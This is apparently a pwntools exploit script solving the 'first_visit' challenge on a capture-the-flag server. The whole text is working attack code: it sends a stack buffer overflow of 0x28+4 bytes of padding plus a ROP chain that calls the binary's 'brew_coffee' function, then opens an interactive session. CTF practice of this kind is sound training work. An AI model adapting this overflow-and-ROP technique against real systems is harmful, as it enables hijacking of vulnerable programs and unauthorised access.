from pwn import *

context.binary = elf = ELF('first_visit')

pr = remote('chals1.apoorvctf.xyz', 3001)
rop = ROP(elf)
rop.call(elf.sym['brew_coffee'])
#gdb.attach(pr)
pr.sendline(b'A'*(0x28+4)+rop.chain())
pr.interactive()